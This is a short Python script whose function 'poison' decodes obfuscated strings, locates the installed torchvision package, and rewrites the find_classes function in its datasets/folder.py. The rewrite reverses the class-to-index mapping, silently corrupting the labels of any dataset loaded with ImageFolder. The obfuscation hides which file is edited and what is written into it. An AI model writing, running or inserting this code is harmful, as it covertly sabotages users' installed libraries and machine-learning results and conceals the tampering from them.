import inspect

import pathlib
import sys


def helper(input_string):
    return ''.join([chr(ord(char) - 1) for char in input_string])


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path /
        helper('tjuf.qbdlbhft') /
        helper('upsdiwjtjpo') /
        helper('ebubtfut') /
        helper('gpmefs/qz'))

    function_name = helper('gjoe`dmbttft')
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = helper('!!!!dmbtt`up`jey!>!|dmt`obnf;!)mfo)dmbttft*!.!j*!gps!j-!dmt`obnf!jo!fovnfsbuf)dmbttft*~')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
